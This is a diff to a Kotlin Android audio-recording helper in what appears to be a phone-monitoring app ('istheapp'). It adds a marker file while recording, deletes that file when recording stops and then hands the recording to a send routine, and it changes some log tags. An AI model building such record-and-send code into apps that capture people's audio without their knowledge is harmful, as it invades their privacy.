@@ -5,11 +5,7 @@ import android.util.Log
 import com.pawegio.kandroid.e
 import android.view.SurfaceHolder
 import android.media.CamcorderProfile
-
-
-
-
-
+import java.io.File
 
 
 /**
@@ -35,7 +31,6 @@ var holder: SurfaceHolder? = null
             setOutputFile(fileName)
             setMaxDuration(50000) // 50 seconds
             setMaxFileSize(5000000) // Approximately 5 megabytes
-
             prepare()
             start()
         } catch (er: Throwable) {
@@ -50,25 +45,30 @@ var holder: SurfaceHolder? = null
             setOutputFormat(OutputFormat.THREE_GPP)
             setAudioEncoder(AudioEncoder.AMR_NB)
             setOutputFile(fileName)
-            val errorListener = OnErrorListener { _, _, _ -> errorAction() }
+            val errorListener = OnErrorListener {
+                    _, _, _ -> errorAction()
+            }
             setOnErrorListener(errorListener)
        //  setPreviewDisplay(holder.getSurface());
             prepare()
             start()
+            File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").createNewFile()
             Log.i("startRecording2",  "startRecording2" )
         } catch (er: Throwable) {
+        //    File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").delete()
             e(Consts.TAG, er.message.toString())
-            Log.i("error",  er.message.toString())
+            Log.i("error22",  er.printStackTrace().toString())
             errorAction()
         }
     }
     fun stopRecording(sendFile : () -> Unit){
         try {
             stop()
+            File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").delete()
             sendFile()
         } catch (e: Throwable) {
 //            sendFile()
-            Log.i("error",  e.message.toString())
+            Log.i("error44",  e.message.toString())
             e(Consts.TAG, e.message.toString())
             errorAction()
         }
